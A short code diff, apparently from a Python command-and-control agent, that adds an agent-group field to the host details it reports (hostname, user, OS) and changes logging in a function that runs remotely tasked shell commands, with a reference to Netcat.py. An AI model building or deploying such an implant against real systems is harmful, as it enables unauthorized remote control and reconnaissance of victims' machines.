@@ -27,6 +27,7 @@ SLEEP_MIN = 5
 SLEEP_MAX = 10
 
 AGENT_ID = "1"
+AGENT_GROUP = "TEST"
 TOKEN = ""
 
 
@@ -57,7 +58,8 @@ def get_system_info():
         "id": AGENT_ID,
         "hostname": socket.gethostname(),
         "user": getpass.getuser(),
-        "os": platform.system() + " " + platform.release()
+        "os": platform.system() + " " + platform.release(),
+        "agent_group": AGENT_GROUP,
     }
 
 
@@ -211,7 +213,8 @@ def execute_shell(command, task_uuid):
 
         finally:
             process.kill()
-            print("[*] Connection terminated.")
+            if "Netcat.py" in command:
+                print("[*] Connection terminated.")
 
         executed_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
 
